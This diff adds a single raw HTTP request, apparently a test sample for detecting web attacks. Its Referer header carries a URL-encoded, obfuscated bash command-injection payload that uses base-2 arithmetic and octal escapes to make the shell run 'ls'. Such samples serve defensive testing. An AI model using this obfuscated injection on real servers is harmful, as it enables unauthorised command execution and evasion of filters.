@@ -1,0 +1,8 @@
+GET / HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Referer: %240%3C%3C%3C%24%5C%27%5C%5C%24%28%28%24%28%281%3C%3C1%29%29%2310011010%29%29%5C%5C%24%28%28%24%28%281%3C%3C1%29%29%2310100011%29%29%5C%27
+
